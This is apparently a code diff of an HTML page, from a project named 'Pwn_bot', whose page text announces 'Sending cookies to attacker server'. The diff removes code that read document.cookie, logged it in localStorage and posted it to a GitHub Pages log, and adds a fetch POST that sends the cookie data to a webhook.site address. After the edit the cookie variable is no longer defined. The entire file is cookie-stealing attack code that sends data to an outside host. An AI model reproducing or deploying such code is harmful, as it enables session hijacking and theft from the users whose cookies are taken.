@@ -9,19 +9,8 @@
   <p>Sending cookies to attacker server...</p>
 
   <script>
-    // Replace with YOUR GitHub Pages URL (or wherever your log viewer is hosted)
-    const LOG_URL = "https://fire-k.github.io/Pwn_bot/log.html";
-
-    // Get cookies or other info
-    const cookieData = document.cookie || "No cookies found";
     
-    // Store cookie in localStorage (shared across pages on same origin)
-    let logs = JSON.parse(localStorage.getItem("cookieLogs") || "[]");
-    logs.push({ cookie: cookieData, time: new Date().toISOString() });
-    localStorage.setItem("cookieLogs", JSON.stringify(logs));
-
-    // Optional: Send to external server if CORS allows (unlikely on GitHub Pages)
-    fetch(LOG_URL, {
+    fetch('https://webhook.site/09a6b80e-9156-4405-bade-5b37f5ecd762', {
       method: 'POST',
       body: JSON.stringify({ cookie: cookieData }),
       headers: { 'Content-Type': 'application/json' },
